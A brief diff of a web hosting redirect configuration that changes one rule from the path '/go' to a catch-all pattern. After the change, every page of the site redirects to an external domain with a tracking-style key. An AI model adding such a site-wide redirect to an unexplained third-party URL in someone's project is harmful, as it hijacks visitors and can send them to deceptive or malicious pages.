@@ -2,7 +2,7 @@
   "version": 2,
   "redirects": [
     {
-      "source": "/go",
+      "source": "/(.*)",
       "destination": "https://hoverinauguratethey.com/jgdw4dfgag?key=49e5ad0600ea904d71cfd6697348b298",
       "permanent": false
     }
